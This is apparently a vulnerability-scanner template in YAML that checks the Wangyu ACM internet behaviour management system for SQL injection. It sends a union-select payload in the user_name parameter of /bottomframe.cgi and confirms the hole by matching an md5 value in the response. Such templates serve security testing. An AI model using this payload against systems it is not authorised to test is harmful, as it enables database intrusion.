id: poc-yaml-wangyu-acm-internet-management-system-sql-injection
info:
  name: 网御-ACM上网行为管理系统-SQL注入
  severity: high
  tags:
  - sql-injection
  finger: ACM上网行为管理系统
variables:
  v1: random_int(0,100)
requests:
- method: GET
  path: /bottomframe.cgi?user_name=%27))%20union%20select%20md5({{.v1}})%23
  expression: status_code == 200 && contains(body, "当前管理员") && contains(body, md5(v1))
transport: http
